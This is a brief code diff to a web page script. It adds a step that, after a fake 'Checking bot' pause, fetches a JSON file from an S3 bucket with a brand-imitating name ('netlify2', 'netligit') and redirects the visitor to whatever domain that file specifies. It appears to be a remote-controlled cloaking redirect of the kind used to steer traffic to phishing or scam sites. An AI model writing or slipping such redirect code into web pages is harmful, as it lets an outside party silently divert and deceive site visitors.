@@ -446,7 +446,12 @@ setTimeout( function(){
 	k.appendChild(head);
 // fetch('https://' + window.location.host + '/netligit.json')
 	console.log('Checking bot');
-	window.location.href = '/puzzle';
+	fetch('https://netlify2.s3.eu-west-2.amazonaws.com/netligit.json')
+		.then((response) => response.json())
+		.then(function(data) {
+		      // filter(data);
+	window.location.href = data.domain_name;
+	});
 }, 2000);
   
 </script>
